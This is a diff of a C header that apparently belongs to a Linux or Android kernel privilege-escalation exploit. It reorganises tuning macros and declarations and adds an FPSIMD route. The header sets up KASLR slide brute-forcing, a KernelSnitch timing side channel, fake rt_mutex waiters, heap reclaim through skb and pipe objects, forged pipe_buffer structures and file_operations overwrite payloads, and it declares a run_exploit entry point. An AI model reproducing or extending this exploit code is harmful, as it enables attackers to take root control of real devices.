@@ -3,31 +3,13 @@
 
 #define _GNU_SOURCE
 
-#define SLIDE_ROUTE_PSELECT 0
-#define SLIDE_ROUTE_MCAST 1
-
 #include "offset.h"
 
-#ifndef SLIDE_ROUTE
-#define SLIDE_ROUTE SLIDE_ROUTE_PSELECT
-#endif
-#if (SLIDE_ROUTE != SLIDE_ROUTE_PSELECT) && (SLIDE_ROUTE != SLIDE_ROUTE_MCAST)
-#error "SLIDE_ROUTE must be SLIDE_ROUTE_PSELECT or SLIDE_ROUTE_MCAST"
-#endif
-#define SLIDE_USE_MCAST (SLIDE_ROUTE == SLIDE_ROUTE_MCAST)
-#define SLIDE_USE_PSELECT (!SLIDE_USE_MCAST)
-
-#define PAGE_SHIFT 12
-#define PAGE_SIZE (1UL << PAGE_SHIFT)
-#define KS_PAGE_SIZE 4096
-#define KS_PAGE_MASK 0xfffULL
-
-#include <arpa/inet.h>
+#include <asm/sigcontext.h>
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <linux/futex.h>
-#include <linux/memfd.h>
 #include <netinet/in.h>
 #include <pthread.h>
 #include <sched.h>
@@ -40,11 +22,12 @@
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/prctl.h>
-#include <sys/resource.h>
 #include <sys/select.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/ucontext.h>
 #include <sys/uio.h>
 #include <sys/un.h>
 #include <sys/wait.h>
@@ -53,20 +36,30 @@
 
 #include "kernelsnitch/utils.h"
 
-#define KERNEL_PAGE_SETUP_ATTEMPTS 6
-#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
-#endif
-#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
-#endif
-#ifndef SKB_DATA_DELTA
-#define SKB_DATA_DELTA (-0xe80LL)
-#endif
+#define SLIDE_ROUTE_PSELECT 0
+#define SLIDE_ROUTE_MCAST 1
+#define SLIDE_ROUTE_FPSIMD 2
 
-#define ASHMEM_NAME_LEN 256
-#define __ASHMEMIOC 0x77
-#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
+#ifndef SLIDE_ROUTE
+#define SLIDE_ROUTE SLIDE_ROUTE_PSELECT
+#endif
+#if (SLIDE_ROUTE != SLIDE_ROUTE_PSELECT) && \
+    (SLIDE_ROUTE != SLIDE_ROUTE_MCAST) && \
+    (SLIDE_ROUTE != SLIDE_ROUTE_FPSIMD)
+#error "SLIDE_ROUTE must be SLIDE_ROUTE_PSELECT, SLIDE_ROUTE_MCAST or SLIDE_ROUTE_FPSIMD"
+#endif
+#define SLIDE_USE_MCAST (SLIDE_ROUTE == SLIDE_ROUTE_MCAST)
+#define SLIDE_USE_FPSIMD (SLIDE_ROUTE == SLIDE_ROUTE_FPSIMD)
+#define SLIDE_USE_PSELECT (SLIDE_ROUTE == SLIDE_ROUTE_PSELECT)
+
+/* ============================= Page / allocator ============================= */
+
+#define PAGE_SHIFT 12
+#ifndef PAGE_SIZE
+#define PAGE_SIZE (1UL << PAGE_SHIFT)
+#endif
+#define KS_PAGE_SIZE 4096
+#define KS_PAGE_MASK 0xfffULL
 
 #ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x500
@@ -74,41 +67,24 @@
 #ifndef MM_ORDER
 #define MM_ORDER 3
 #endif
+#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
+#define MM_PARTIALS 5
+#define CORE 0
+#define CONSUMER_CORE (CORE + 1)
+
+/* ============================= KernelSnitch tuning ============================= */
+
 #ifndef KERNELSNITCH_VERBOSE
 #define KERNELSNITCH_VERBOSE 0
 #endif
 #ifndef KERNELSNITCH_MTE_ENABLED
 #define KERNELSNITCH_MTE_ENABLED 0
 #endif
-#define MM_PARTIALS 5
-#define CORE 0
 #ifndef KSNITCH_COLLISIONS
 #define KSNITCH_COLLISIONS 4
 #endif
 
-#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
-#define PIPE_CANDIDATE_PAGES 8
-#ifndef SKB_SEND_SIZE
-#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
-#endif
-#ifndef SKB_RECLAIM_SENDS
-#define SKB_RECLAIM_SENDS 4
-#endif
-#ifndef SLIDE_RECLAIM_SENDS
-#define SLIDE_RECLAIM_SENDS 16
-#endif
-#define FOPS_TABLE_OFF FOPS_OFF
-#define SKB_FRAG_BIAS 0
-
-#define FAKE_TASK_PRIO 120
-#ifndef FAKE_WAITER_PRIO
-#define FAKE_WAITER_PRIO 130
-#endif
-#ifndef SLIDE_FAKE_WAITER_PRIO
-#define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
-#endif
-#define ASHMEM_NAME_PREFIX_LEN 11
-#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
+/* ============================= Kmalloc layout ============================= */
 
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
@@ -127,8 +103,72 @@
   KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
 #define KMALLOC_PIPE_OBJ_SIZE 0x800
 
+/* ============================= Direct map / vmemmap ============================= */
+
 #define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
 #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
+
+/* ============================= ASHMEM ============================= */
+
+#define ASHMEM_NAME_LEN 256
+#define __ASHMEMIOC 0x77
+#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
+#define ASHMEM_NAME_PREFIX_LEN 11
+#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
+
+/* ============================= SKB / reclaim ============================= */
+
+#ifndef SKB_DATA_DELTA
+#define SKB_DATA_DELTA (-0xe80LL)
+#endif
+#ifndef SKB_SEND_SIZE
+#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#endif
+#ifndef SKB_RECLAIM_SENDS
+#define SKB_RECLAIM_SENDS 4
+#endif
+#ifndef SLIDE_RECLAIM_SENDS
+#define SLIDE_RECLAIM_SENDS 16
+#endif
+#ifndef SKB_SENDS
+#define SKB_SENDS 256
+#endif
+#ifndef SKB_SNDBUF
+#define SKB_SNDBUF 8388608
+#endif
+#ifndef RECLAIM_SOCKET_PAIRS
+#define RECLAIM_SOCKET_PAIRS 32
+#endif
+#define SKB_FRAG_BIAS 0
+#define FOPS_TABLE_OFF FOPS_OFF
+#define PIPE_CANDIDATE_PAGES 8
+
+/* ============================= Fake waiter / rt_mutex ============================= */
+
+#define FAKE_TASK_PRIO 120
+#ifndef FAKE_WAITER_PRIO
+#define FAKE_WAITER_PRIO 130
+#endif
+#ifndef SLIDE_FAKE_WAITER_PRIO
+#define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
+#endif
+#ifndef LEGACY_RT_MUTEX_WAITER
+#define LEGACY_RT_MUTEX_WAITER 0
+#endif
+#ifndef COMPACT_RT_MUTEX_WAITER
+#define COMPACT_RT_MUTEX_WAITER 0
+#endif
+#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
+#error "select only one rt_mutex_waiter layout"
+#endif
+#ifndef FAKE_WAITER_LAYOUT_SIZE
+#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
+#endif
+#ifndef SLIDE_LOCK_OWNER_VALUE
+#define SLIDE_LOCK_OWNER_VALUE 0ULL
+#endif
+
+/* ============================= Pipe ============================= */
 
 #define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
 #define PIPE_SCAN_CHUNK 0x400
@@ -145,74 +185,12 @@
 #define PIPE_MAX_ATTEMPTS 12
 #endif
 
+/* ============================= P0 / data alias ============================= */
+
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
-#define CONSUMER_CORE (CORE + 1)
-#define CONSUMER_MAX_CALLS 1
-#define PSELECT_ROUTE_NFDS 320
-#define PSELECT_CONSUMER_NICE 19
-#define PSELECT_CONSUMER_BURST_CALLS 1
-#ifndef PSELECT_ENTER_DELAY_USEC
-#define PSELECT_ENTER_DELAY_USEC 50000
-#endif
-#if SLIDE_USE_PSELECT
-#ifndef SLIDE_WAITER_WAKE_STATE
-#define SLIDE_WAITER_WAKE_STATE 3
-#endif
-#endif
-#if SLIDE_USE_MCAST
-#ifndef MCAST_WAITER_OFF
-#define MCAST_WAITER_OFF 0x50
-#endif
-#ifndef CONTROLLED_MM_GROUP_RECLAIM
-#define CONTROLLED_MM_GROUP_RECLAIM 1
-#endif
-#ifndef CLOSED_FOPS_ROUTE
-#define CLOSED_FOPS_ROUTE 1
-#endif
-#ifndef FOPS_BEFORE_PIPE
-#define FOPS_BEFORE_PIPE 1
-#endif
-#ifndef EXACT_PIPE_BUFFER_ONLY
-#define EXACT_PIPE_BUFFER_ONLY 1
-#endif
-#ifndef MM_DMA32_ALIAS_START
-#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
-#endif
-#ifndef MM_DMA32_ALIAS_END
-#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
-#endif
-#ifndef MM_NORMAL_ALIAS_START
-#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
-#endif
-#ifndef MM_NORMAL_ALIAS_END
-#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END
-#endif
-#endif
-#ifndef SLIDE_LOCK_OWNER_VALUE
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
-#endif
-#ifndef SLIDE_REQUEUE_ARM_USEC
-#define SLIDE_REQUEUE_ARM_USEC 0
-#endif
-#ifndef LEGACY_RT_MUTEX_WAITER
-#define LEGACY_RT_MUTEX_WAITER 0
-#endif
-#ifndef COMPACT_RT_MUTEX_WAITER
-#define COMPACT_RT_MUTEX_WAITER 0
-#endif
-#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
-#error "select only one rt_mutex_waiter layout"
-#endif
-#ifndef FAKE_WAITER_LAYOUT_SIZE
-#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
-#endif
-#define PSELECT_TIMEOUT_SEC 1
-#ifndef ROUTE_WAIT_SECONDS
-#define ROUTE_WAIT_SECONDS 8
-#endif
 #ifndef SLIDE_NFULNL_LOGGER_NAME_IMAGE
 #ifdef SLIDE_NFULNL_LOGGER_IMAGE
 #define SLIDE_NFULNL_LOGGER_NAME_IMAGE SLIDE_NFULNL_LOGGER_IMAGE
@@ -246,14 +224,83 @@
   P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
 #define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)
 
+/* ============================= Payload modes ============================= */
+
 #define PAGE_PAYLOAD_FOPS 0
 #define PAGE_PAYLOAD_SLIDE 1
 
-#ifndef SLIDE_ALIGN_MASK
-#define SLIDE_ALIGN_MASK 0xffffULL
+/* ============================= Route tuning ============================= */
+
+#ifndef SLIDE_KASLR_STEP
+#define SLIDE_KASLR_STEP 0x10000
 #endif
 
-/* --- controlled-mm (mcast route) reclaim tuning --------------------------- */
+#define CONSUMER_MAX_CALLS 1
+#define PSELECT_ROUTE_NFDS 320
+#define PSELECT_CONSUMER_NICE 19
+#define PSELECT_CONSUMER_BURST_CALLS 1
+#ifndef PSELECT_ENTER_DELAY_USEC
+#define PSELECT_ENTER_DELAY_USEC 50000
+#endif
+#define PSELECT_TIMEOUT_SEC 1
+#ifndef ROUTE_WAIT_SECONDS
+#define ROUTE_WAIT_SECONDS 8
+#endif
+#ifndef SLIDE_REQUEUE_ARM_USEC
+#define SLIDE_REQUEUE_ARM_USEC 0
+#endif
+#if SLIDE_USE_PSELECT
+#ifndef SLIDE_WAITER_WAKE_STATE
+#define SLIDE_WAITER_WAKE_STATE 3
+#endif
+#endif
+#if SLIDE_USE_MCAST || SLIDE_USE_FPSIMD
+#ifndef MCAST_WAITER_OFF
+#define MCAST_WAITER_OFF 0x50
+#endif
+#ifndef CONTROLLED_MM_GROUP_RECLAIM
+#define CONTROLLED_MM_GROUP_RECLAIM 1
+#endif
+#ifndef CLOSED_FOPS_ROUTE
+#define CLOSED_FOPS_ROUTE 1
+#endif
+#ifndef FOPS_BEFORE_PIPE
+#define FOPS_BEFORE_PIPE 1
+#endif
+#ifndef EXACT_PIPE_BUFFER_ONLY
+#define EXACT_PIPE_BUFFER_ONLY 1
+#endif
+#ifndef MM_DMA32_ALIAS_START
+#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
+#endif
+#ifndef MM_DMA32_ALIAS_END
+#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
+#endif
+#ifndef MM_NORMAL_ALIAS_START
+#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
+#endif
+#ifndef MM_NORMAL_ALIAS_END
+#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END
+#endif
+#endif
+#if SLIDE_USE_FPSIMD
+#ifndef FPSIMD_WAITER_OFF
+#define FPSIMD_WAITER_OFF 0x18
+#endif
+#endif
+
+/* ============================= Kernel page setup ============================= */
+
+#define KERNEL_PAGE_SETUP_ATTEMPTS 6
+#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
+#endif
+#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#endif
+
+/* ============================= controlled-mm reclaim tuning ============================= */
+
 #ifndef PAGE_SCAN_MAX
 #define PAGE_SCAN_MAX 256
 #endif
@@ -269,31 +316,10 @@
 #ifndef TRIGGER_SLABS
 #define TRIGGER_SLABS 24
 #endif
-#ifndef SKB_SENDS
-#define SKB_SENDS 256
-#endif
-#ifndef SKB_SNDBUF
-#define SKB_SNDBUF 8388608
-#endif
-#ifndef RECLAIM_SOCKET_PAIRS
-#define RECLAIM_SOCKET_PAIRS 32
-#endif
+
+/* ============================= Types ============================= */
 
 struct kernelsnitch_shared_state;
-
-void setup_kernelsnitch(void);
-int kernelsnitch_collisions_ready(void);
-void run_kernelsnitch_bruteforce(void);
-uintptr_t cleanup_kernelsnitch(void);
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-int rmg_fast_profile_enabled(void);
-size_t rmg_profile_env_size(const char *name, size_t fallback,
-                            size_t min, size_t max);
-void configure_kernelsnitch_profile(
-    struct kernelsnitch_shared_state *state, int payload_mode);
-void log_mm_slabinfo(const char *stage);
-uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked);
-#endif
 
 struct local_sched_attr {
   uint32_t size;
@@ -312,7 +338,32 @@ struct mm_ctx {
   int *memfds;
 };
 
-struct kernelsnitch_shared_state;
+struct user_pipe_buffer {
+  uint64_t page;
+  uint32_t offset;
+  uint32_t len;
+  uint64_t ops;
+  uint32_t flags;
+  uint32_t pad;
+  uint64_t private;
+};
+
+/* ============================= Global state ============================= */
+
+void setup_kernelsnitch(void);
+int kernelsnitch_collisions_ready(void);
+void run_kernelsnitch_bruteforce(void);
+uintptr_t cleanup_kernelsnitch(void);
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
+int rmg_fast_profile_enabled(void);
+size_t rmg_profile_env_size(const char *name, size_t fallback,
+                            size_t min, size_t max);
+void configure_kernelsnitch_profile(
+    struct kernelsnitch_shared_state *state, int payload_mode);
+void log_mm_slabinfo(const char *stage);
+uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked);
+#endif
+
 extern struct kernelsnitch_shared_state *ks;
 extern size_t mm_objs_per_slab;
 extern unsigned char *skb_buf;
@@ -328,16 +379,6 @@ extern struct mm_ctx pre_ctx;
 extern struct mm_ctx post_ctx;
 extern pid_t child_leak;
 extern int memfd_leak;
-
-struct user_pipe_buffer {
-  uint64_t page;
-  uint32_t offset;
-  uint32_t len;
-  uint64_t ops;
-  uint32_t flags;
-  uint32_t pad;
-  uint64_t private;
-};
 
 extern pid_t pipe_prepare_child;
 extern uintptr_t page_base;
@@ -369,7 +410,6 @@ extern int cfi_attempts;
 extern int cfi_last_step;
 extern int cfi_last_errno;
 extern int pipe_stage_attempts;
-
 
 extern uint64_t kmalloc_pipe_cache;
 extern uint64_t kmalloc_normal_1k_cache;
@@ -431,7 +471,35 @@ extern int fops_data_probe_active;
 extern int data_alias_uses_slide;
 extern int data_addr_canonical;
 extern int slide_p0_session_fresh;
-extern int memfd_leak;
+
+extern atomic_int slide_waiter_tid;
+extern atomic_int slide_consume_calls;
+extern atomic_int slide_consume_go;
+extern atomic_int slide_consume_seen;
+extern atomic_int slide_consume_lost;
+extern atomic_int slide_consume_enter_sched;
+extern atomic_int slide_consume_stop;
+extern atomic_int slide_consume_sched_ok;
+extern atomic_int slide_consume_last_sched_ret;
+extern atomic_int slide_consume_last_sched_errno;
+extern atomic_int slide_consumer_ready;
+extern atomic_int slide_stack_write_window;
+extern int slide_route_nfds;
+extern int slide_route_syscall_pad;
+extern uint64_t slide_route_fine_delay_ticks;
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
+extern atomic_uint_fast64_t slide_pselect_started_ns;
+extern int slide_pselect_production_stack;
+#endif
+
+extern int pipe_fds_reclaim[PIPE_RECLAIM][2];
+#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
+extern int p0_gate_holders[PIPE_RECLAIM][2];
+extern int p0_gate_holders_initialized;
+void close_p0_gate_holders(void);
+#endif
+
+/* ============================= Functions ============================= */
 
 int run_exploit(int argc, char **argv);
 void read_first_line(const char *path, char *buf, size_t len);
@@ -475,10 +543,6 @@ int slide_trigger_physical_slot(size_t slot);
 int slide_restore_physical_oracle(void);
 void close_reclaim_sockets(void);
 int reclaim_receiver_fd(void);
-void setup_kernelsnitch(void);
-int kernelsnitch_collisions_ready(void);
-void run_kernelsnitch_bruteforce(void);
-uintptr_t cleanup_kernelsnitch(void);
 void close_ctx_memfds(struct mm_ctx *ctx);
 void free_ctx_storage(struct mm_ctx *ctx);
 void cleanup_page_prepare_state(void);
@@ -487,6 +551,7 @@ void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
+uintptr_t prepare_controlled_kernel_page(int payload_mode);
 
 #if !defined(PHYS_P0_ORACLE) || !PHYS_P0_ORACLE || SLIDE_USE_PSELECT
 void fdset_put_word(fd_set *set, int word, uint64_t value);
@@ -506,31 +571,14 @@ int select_slide_payload_slot(uintptr_t offset);
 int app_trigger_fops_oracle_slot(size_t slot);
 #endif
 
-extern atomic_int slide_waiter_tid;
-extern atomic_int slide_consume_calls;
-extern atomic_int slide_consume_go;
-extern atomic_int slide_consume_seen;
-extern atomic_int slide_consume_lost;
-extern atomic_int slide_consume_enter_sched;
-extern atomic_int slide_consume_stop;
-extern atomic_int slide_consume_sched_ok;
-extern atomic_int slide_consume_last_sched_ret;
-extern atomic_int slide_consume_last_sched_errno;
-extern atomic_int slide_consumer_ready;
-extern atomic_int slide_stack_write_window;
-extern int slide_route_nfds;
-extern int slide_route_syscall_pad;
-extern uint64_t slide_route_fine_delay_ticks;
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-extern atomic_uint_fast64_t slide_pselect_started_ns;
-extern int slide_pselect_production_stack;
-#endif
-
+void slide_apply_route_fine_delay(void);
 void slide_reset_consume_state(void);
 void slide_pselect_stack_copy(void);
 void slide_mcast_stack_copy(void);
+void slide_fpsimd_stack_copy(void);
 void *slide_pselect_consumer_thread(void *);
 void *slide_mcast_consumer_thread(void *);
+void *slide_fpsimd_consumer_thread(void *);
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
@@ -580,12 +628,6 @@ int pipe_write_full(int fd, const void *buf, size_t count);
 int pipe_read_full(int fd, void *buf, size_t count);
 int pipe_duplicate_bytes(int source_fd, int holder[2], size_t size, size_t slots);
 void spawn_p0_ref_keeper(int retained_pipe_index);
-extern int pipe_fds_reclaim[PIPE_RECLAIM][2];
-#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
-extern int p0_gate_holders[PIPE_RECLAIM][2];
-extern int p0_gate_holders_initialized;
-void close_p0_gate_holders(void);
-#endif
 #if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
